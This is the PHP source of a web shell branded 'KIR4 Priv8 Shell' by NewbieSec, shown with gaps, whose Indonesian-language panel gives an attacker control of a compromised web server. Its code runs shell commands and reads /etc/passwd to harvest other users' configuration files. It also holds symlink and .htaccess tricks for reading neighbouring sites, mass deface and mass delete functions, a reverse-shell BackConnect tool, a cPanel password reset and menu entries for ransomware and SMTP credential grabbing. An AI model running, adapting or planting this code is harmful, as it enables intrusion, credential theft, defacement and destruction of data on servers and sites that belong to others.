...
$aupas 			= "a7a189951821c2ebf7bf3167ec3f9fbe";
...
<html>
	...
	if (top == window) {
		...
		<meta name="author" content="KIR4"/>
		<meta name="copyright" content="KIR41337"/>
		<title>-= KIR4SEC sHeLL=-</title>
		<link rel="icon" type="image/png" sizes="192x192" href="https://rareee.github.io/ico.png"/>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
		<style>
			@font-face {
				font-family: "xp";
				src: url(https://rareee.github.io/font/xp.ttf);
			}
			@font-face {
				font-family: "re";
				src: url(https://rareee.github.io/font/re.ttf);
			}
			h1 {
				font-family: "xp";
				font-size: 420%;
	...
	<body class="bg-dark text-center text-light">
		<div class="container text-center mt-3">
			<h1>-= KIR4 =-</h1>
			<h5>Priv8 Shell</h5><hr/>
			<p class="mt-3 font-weight-bold"> Login Bro</p>
			<form method="post">
				...
				<input type="submit" class="btn btn-primary btn-block" class="form-control" value="Login">
			</form>
		</div>
		<a href="https://facebook.com/Raree" class="fixed-bottom mb-3">Copyright 2019 Â© NewbieSec</a>
	</body>
</html>
<?php
exit;
...
/*
	...
	* nsc Download
*/
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['nsc'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
...
function r($dir,$perm) {
	...
	$show_ds = (!empty($ds)) ? "<a href='?dir=$dir&nsc=disabfunc' class='ds'>$ds</a>" : "<a href='?dir=$dir&nsc=disabfunc'><font color=green>NONE</font></a>";
...
<html>
	<head>
		...
		<meta name="copyright" content="-= KIR4 =-"/>
		<link rel="icon" type="image/png" href="https://rareee.github.io/ico.png"/>
		<title>-= KIR4 =-</title>
		<link rel="stylesheet" href="https://tools.newbiesec.ga/css/waves-effect.css">
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"/>
	...
	<body class="bg-dark text-light">
		...
		<style>
			...
			@import url(https://rareee.github.io/font/hacked.ttf);
		...
		echo '
		<nav class="">
			<button class="navbar-toggler"type="button" data-toggle="collapse" data-target="#info" aria-label="">
				<a href="#" class="fiture btn btn-primary btn-sm"><i class="fa fa-exclamation-triangle"></i> Informasi</a>
			</button>
			<div class="collapse navbar-collapse" id="info">
				<h5><i class="fa fa-terminal"></i>Command : </h5>
					<form>
					<div class="input-group">
						<input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | heked">
						<input type="submit" value=">>" class="fiture btn btn-primary btn-sm">
					</div>
					</form>
					<hr/>
...
//tutup
		...
		<div class="container">
			...
			<a href="?" class="fiture btn btn-primary btn-sm"><i class="fa fa-home"></i> Home</a>
					<a href="?dir='.$dir.'&nsc=upload" class="fiture btn btn-primary btn-sm"><i class="fa fa-upload"></i> Upload</a>
					<a href="?about" class="fiture btn btn-primary btn-sm"><i class="fa fa-info"></i> About Us</a>
					<a href="?keluar" class="fiture btn btn-primary btn-sm"><i class="fa fa-sign-out"></i> keluar</a>
			<div class="navbar-toggler" type="mmk" data-toggle="collapse" data-target="#memeek" aria-label="">
					<a href="#" class="fiture btn btn-primary btn-sm"><i class="fa fa-plus-circle"></i> Tools Backdoor</a>
			</div>
			<br>
			<div class="collapse navbar-collapse" id="memeek">
					<a href="?dir='.$dir.'&nsc=buat_file" class="fiture btn btn-warning btn-sm"><i class="fa fa-exclamation-triangle"></i> Buat File</a>
					<a href="?dir='.$dir.'&nsc=buat_folder" class="fiture btn btn-warning btn-sm"><i class="fa fa-plus"></i> Buat Folder</a>
					<a href="?dir='.$dir.'&nsc=masdef" class="fiture btn btn-warning btn-sm"><i class="fa fa-exclamation-triangle"></i> Mass Deface</a>
					<a href="?dir='.$dir.'&nsc=masdel" class="fiture btn btn-warning btn-sm"><i class="fa fa-trash"></i> Mass Delete</a>
					<a href="?dir='.$dir.'&nsc=jumping" class="fiture btn btn-warning btn-sm"><i class="fa fa-exclamation-triangle"></i> Jumping</a>
					<a href="?dir='.$dir.'&nsc=config" class="fiture btn btn-warning btn-sm"><i class="fa fa-cogs"></i> Config</a>
					<a href="?dir='.$dir.'&nsc=adminer" class="fiture btn btn-warning btn-sm"><i class="fa fa-user"></i> Adminer</a>
					<a href="?dir='.$dir.'&nsc=symlink" class="fiture btn btn-warning btn-sm"><i class="fa fa-exclamation-circle"></i> Symlink</a>
					<a href="?dir='.$dir.'&nsc=bctools" class="fiture btn btn-warning btn-sm"><i class="fas fa-network-wired"></i> Network</a>
					<a href="?dir='.$dir.'&nsc=resetpasscp" class="fiture btn btn-warning btn-sm"><i class="fa fa-key"></i> Auto Reset Cpanel</a>
					<a href="?dir='.$dir.'&nsc=auteduser" class="fiture btn btn-warning btn-sm"><i class="fas fa-user-edit"></i> Auto Edit User</a>
					<a href="?dir='.$dir.'&nsc=ransom" class="fiture btn btn-warning btn-sm"><i class="fab fa-keycdn"></i> Ransomware</a>
					<a href="?dir='.$dir.'&nsc=smtpgrab" class="fiture btn btn-warning btn-sm"><i class="fas fa fa-exclamation-circle"></i> SMTP Grabber</a>
					<a href="?dir='.$dir.'&nsc=bypascf" class="fiture btn btn-warning btn-sm"><i class="fas fa-cloud"></i> Bypass Cloud Flare</a>
					<a href="?dir='.$dir.'&nsc=zip_menu" class="fiture btn btn-warning btn-sm"><i class="fa fa-file-archive-o"></i> Zip Menu</a>
			</div>
			</div>
			<hr>';
		//keluar
		...
		if (isset($_GET['about'])) {
			echo '<div class="card text-center bg-light about">
				<h4 class="card-header">-= NewbieSec =-</h4>
				<div class="card-body">
					<center><div class="img"></div></center>
					<p class="card-text">-= NewbieSec =- Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
				</div>
				<div class="card-footer">
					<small class="card-text text-muted">Copyright 2019 NewbieSec</small>
				</div>
			</div><br/>';
			exit;
		}
		...
		//buat_file
		if ($_GET['nsc'] == 'buat_file') {
			echo "<h5><img src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png' class='ico2'></img> Buat File :</h5>
			<form method='POST'>
				<div class='input-group'>
		...
		*/
		if($_GET['nsc'] == 'view') {
			echo '[ <a class="active" href="?dir='.$dir.'&nsc=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&nsc=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&nsc=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&nsc=hapusf&file='.$file.'">Delete</a> ]  [ <a href="?&dir='.$path.'&nsc=download&file='.$path.'/'.$file.'">Download</a> ]
		...
		*/
		if($_GET['nsc'] == 'edit') {
			echo '[ <a href="?dir='.$dir.'&nsc=view&file='.$file.'">Lihat</a> ]  [ <a class="active" href="?dir='.$dir.'&nsc=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&nsc=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&nsc=hapusf&file='.$file.'">Delete</a> ]  [ <a href="?&dir='.$path.'&nsc=download&file='.$path.'/'.$file.'">Download</a> ]
			';
			echo "<form method='POST'>
		...
		*/
		if($_GET['nsc'] == 'rename') {
			echo '[ <a href="?dir='.$dir.'&nsc=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&nsc=edit&file='.$file.'">Edit</a> ]  [ <a class="active" href="?dir='.$dir.'&nsc=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&nsc=hapusf&file='.$file.'">Delete</a> ]  [ <a href="?&dir='.$path.'&nsc=download&file='.$path.'/'.$file.'">Download</a> ]';
			echo "<form method='POST'>
		...
		*/
		...
		$nfol = basename($dir);
		//chmod
		if($_GET['nsc'] == 'chmod_dir') {
			$nfol = basename($dir);
			echo "<form method='POST'>
				<h5>Chmod Folder : $nfol </h5>
				<div class='form-group input-group'>
					<input type='text' name='perm' class='form-control' value='".substr(sprintf('%o', fileperms($_GET['dir'])), -4)."'>
					<input type='submit' class='btn btn-primary form-control' value='Chmod' name='chmo'>
				</div>
			</form>";
			if(isset($_POST['chmo'])){
		...
		/*
			Add Folder
		*/
		if ($_GET['nsc'] == 'buat_folder' ) {
			echo "
			<h4>$imgfol Buat Folder :</h4>
			<form method='POST'>
				<div class='input-group'>
		...
		/*
			Rename Folder
		*/
		if ($_GET['nsc'] == 'rename_folder' ) {
			echo "
			[ <a href='?dir=".$dir."&nsc=rename_folder' class='active'>Rename</a> ]  [ <a href='?dir=".$dir."&nsc=hapus_folder'>Delete</a> ] 
			<h4>$imgfol Rename Folder : $nfol </h4>
			<form method='POST'>
		...
		/*
			Delete Folder
		*/
		if ($_GET['nsc'] == 'hapus_folder' ) {
			echo "
			<div class='card card-body text-center text-dark mb-4'>
				<p>Apakah Yakin Menghapus : $nfol ?</p>
				<form method='POST'>
	...
	if($_GET['nsc'] == 'masdef') {
		...
		echo "</textarea><br/>";
			...
			echo "<form method='post'>
				...
				<input type='text' name='d_file' placeholder='re.html' class='form-control'><br/>
				<h5>$imgfile Isi File :</h5>
				<textarea name='script' class='form-control' rows='13' placeholder='Hacked by Rare1337'></textarea><br/>
				<input type='submit' name='start' value='Mass Deface' class='btn btn-primary form-control'><br/>
			</form>";
		}
		exit;
	}
	...
	if($_GET['nsc'] == 'jumping') {
		...
		if(preg_match("/hsphere/", $dir)) {
			...
			echo "</pre>";
				...
				echo  '</textarea><br>
					  <input type="submit" value="Jumping" name="jump" class="btn btn-primary btn-block">
					  </form></center>';
			}
			...
			echo "<br><pre>";
			$etc = fopen("/etc/passwd", "r") or die("<font color=red>Tidak bisa membaca /etc/passwd</font><br/>");
			while($passwd = fgets($etc)) {
				if($passwd == '' || !$etc) {
					echo "<font color=red>Tidak bisa membaca /etc/passwd</font><br/>";
				} else {
					...
					foreach($user_jumping[1] as $user_pro_jump) {
						...
						if(is_readable($user_jumping_dir)) {
							...
							if(function_exists('posix_getpwuid')) {
								...
								if($domain_jump == '') {
									echo " => ( <font color=red>gabisa ambil nama domain nya bro</font> )<br>";
								} else {
	...
	*/
	if($_GET['nsc'] == 'config') {
		if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("nsc_config", 0777);
		$isi_htc = "Options allnRequire NonenSatisfy Any";
		$htc = fopen("nsc_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		...
		foreach($user_config[1] as $user_con) {
				...
				$grab_config = array(
					...
					foreach($grab_config as $config => $nama_config) {
						...
						if($ambil_config == '') {
							...
							$file_config = fopen("nsc_config/$user_con-$nama_config.txt","w");
			...
			<a href='?dir=$dir/nsc_config' class='btn btn-success btn-block mb-4'>Disini bro</a>";
		}else{
			echo "<form method='post'>
				<p class='text-danger'>/etc/passwd error ? <a href='?dir=".$dir."&nsc=passwbypass'>Bypass Disini</a></p>
				<textarea name='passwd' class='form-control' rows='13'>".file_get_contents('/etc/passwd')."</textarea><br/>
				<input type='submit' class='btn btn-primary btn-block' value='Get Config!!'>
			</form>";
		}
		exit;
	}
	...
	/*
		Bypass etc/passwd
	*/
	if($_GET['nsc'] == 'passwbypass') {
		echo '<div claas="container">
			<form method="POST">
				<h5 class="text-center">Bypass etc/passwd Type :</h5>
				...
				<h5 class="text-center">Bypass User Menggunakan :</h5>
				<div class="d-flex justify-content-center flex-wrap">
	...
	*/
	if($_GET['nsc'] == 'symlink') {
		...
		if(!$d0mains) {
			die ("[ <a href='?dir=$dir&nsc=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&nsc=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&nsc=sym_bypass'>Symlink Bypass</a> ]<br/><font color='red'>Error tidak dapat membaca  /etc/named.conf</font><br/><br/>");
		}
		##htaccess
		if($d0mains){
			@mkdir("nscn_sym",0777);
			...
			DirectoryIndex re.html
			AddType text/plain php html php5 phtml
			AddHandler text/plain php html php5 phtml
			Satisfy Any';
			$fp3 = fopen('.htaccess','w');
			$fw3 = fwrite($fp3,$file3);@fclose($fp3);
			echo "[ <a href='?dir=$dir&nsc=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&nsc=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&nsc=sym_bypass'>Symlink Bypass</a> ]
			<div class='tmp'>
					...
					if(eregi("zone",$d0main)){
						...
						if(strlen(trim($domains[1][0])) > 2){
							...
							echo "<tr>
								...
								<td>".$user['name']."</td>
								<td><a href='$full/nsc_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
							</tr>";
							flush();
							$dcount++;
						}
				...
				<table class='text-center table-responsive'>
					...
					while(!feof($file)){
						...
						echo "<tr>
							<td>".$dcount."</td>
							<td>".$matches."</td>
							<td><a href=$full/nsc_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
						</tr>";
						$dcount++;
					}
					fclose($file);
	...
	if($_GET['nsc'] == 'symread') {
		...
		echo "<form method='post' action='?dir=$dir&nsc=symread&save=1'>
	...
	if ($_GET['nsc'] == 'sym_404'){
		...
		if($_POST['execute']){
			@rmdir("nsc_sym404");
			@mkdir("nsc_sym404", 0777);
			$dir = $_POST['dir'];
			$isi = $_POST['isi'];
			@system("ln -s ".$dir."nsc_sym404/".$isi);
			@symlink($dir,"nsc_sym404/".$isi);
			$inija = fopen("nsc_sym404/.htaccess", "w");
			@fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex nscn.html\nAddType text/plain php html php5 phtml\nAddHandler text/plain php html php5 phtml\nSatisfy Any");
			echo'<a href="/nsc_sym404/" target="_blank" class="btn btn-success btn-block mb-3">Click Me!!</a>';
		}else{
			...
			<form method="post">
				...
				<input type="submit" class="btn btn-danger btn-block" value="Execute" name="execute"/><br>
				<p class="text-muted">*note: Letak config tidak semuanya berada di <u>public_html/configname.php</u> jadi silahkan ubah sesuai letaknya ya bro.</p>
			</form>';
		}
		exit;
	}
	...
	if ($_GET['nsc'] == 'sym_bypass'){
					...
					<table width='100%' class='text-center table-responsive mb-4'>
						...
						foreach ($fil3 as $f){
							...
							echo "<tr>
								...
								<td>
									<a href='$full/sym/root/home/$user/public_html' target='_blank'>Symlink </a>
								</td>
								<td>
		...
		echo "read /etc/passwd <font color='red'>error ?  </font><a href='?dir=".$dir."&nsc=passwbypass'>Bypass Here</a>
		<form method='post' action='?dir=$dir&nsc=sym_bypass&save=1'>
			<textarea class='form-control' rows='13' name='file'>";
				flush();
				$file = '/etc/passwd';
				$r3ad = @fopen($file, 'r');
	...
	*/
	if($_GET['nsc'] == 'bctools'){
		echo "<h4 class='text-center mb-4'>BackConnect Tools</h4>
		<form method='post'>
			<div class='row'>
				<div class='col-md-10'>
					...
					<input type='submit' class='btn btn-danger btn-block' value='Gass Slurr'>
				</div>
			</div>
		</form>";
	...
	/*
		...
		* Kuda Shell
	*/
	if($_GET['nsc'] == 'disabfunc'){
		echo "<div class='card card-body text-center text-dark'><h4 class='text-center mt-2 mb-3'>Bypass Disable Functions</h2>
		<form method='POST'>
	...
	if($_GET['nsc'] == 'auteduser') {
		if($_POST['hajar']) {
			...
			<form method='post'>
				...
				<h5>Set User & Pass :</h5>
				<input type='text' name='user_baru' value='newbiesec' class='form-control mb-3' placeholder='Set Username'>
				<input type='text' name='pass_baru' value='rare1337' class='form-control mb-4' placeholder='Set Password'>
	...
	*/
	if($_GET['nsc'] == 'zip_menu') {
		...
		echo '<div class="card card-body text-dark mb-4">
			<h5 class="text-center">Zip Menu</h5>
		...
		echo '<div id="tab"><table class="text-white mt-1 table-hover table-responsive">
			...
			foreach($scandir as $dir){
				...
				echo '<tr class="text-center">
					...
					<td>
					<a href="?dir='.$path.'/'.$dir.'&nsc=chmod_dir">
';
					if(is_writable($path.'/'.$dir)) echo '<font color="#00ff00">';
					elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
					echo perms($path.'/'.$dir);
					if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font></a></td>
					<td><a title="Rename" class="badge badge-success" href="?dir='.$path.'/'.$dir.'&nsc=rename_folder">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Delete" class="badge badge-danger" href="?dir='.$path.'/'.$dir.'&nsc=hapus_folder">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
					</td>';
			}
			...
			foreach($scandir as $file){
				...
				echo '<tr class="text-center">
					...
					echo' <a href="?dir='.$path.'&nsc=view&file='.$path.'/'.$file.'">'.$_file.'</a></td>
					<td>'.formatSize(filesize($file)).'</td>
					<td>'.$ftime.'</td>
					<td><a href="?dir='.$path.'&nsc=chmod_file&file='.$path.'/'.$file.'" class="text-center">';
					...
					<td class="d-flex">
						<a title="Lihat" class="badge badge-info" href="?dir='.$path.'&nsc=view&file='.$path.'/'.$file.'">&nbsp;<i class="fa fa-eye"></i>&nbsp;</a>&nbsp;&nbsp;
						<a title="Edit" class="badge badge-success" href="?dir='.$path.'&nsc=edit&file='.$path.'/'.$file.'">&nbsp;<i class="far fa-edit"></i>&nbsp;</a>&nbsp;&nbsp;
						<a title="Rename" class="badge badge-success" href="?dir='.$path.'&nsc=rename&file='.$path.'/'.$file.'">&nbsp;<i class="fa fa-pencil"></i>&nbsp;</a>&nbsp;&nbsp;
						<a title="Delete" class="badge badge-danger" href="?dir='.$path.'&nsc=hapusf&file='.$path.'/'.$file.'" title="Delete">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>&nbsp;&nbsp;
						<a title="Download" class="badge badge-primary" href="?&dir='.$path.'&nsc=download&file='.$path.'/'.$file.'" title="Download">&nbsp;<i class="fa fa-download"></i>&nbsp;</a>
					</td>
				</tr>';
			}
...
document.write(" Jam " + ((now.getHours() < 10) ? "0" : "") + now.getHours() + ":" + ((now.getMinutes() < 10)? "0" : "") + now.getMinutes() + ":" + now.getSeconds() + (" W.I.B "))

</script>

</font>
Copyright 2019 Â© <a href="http://facebook.com/Raree">NewbieSec Crew</a>
</center>
<br/>';	
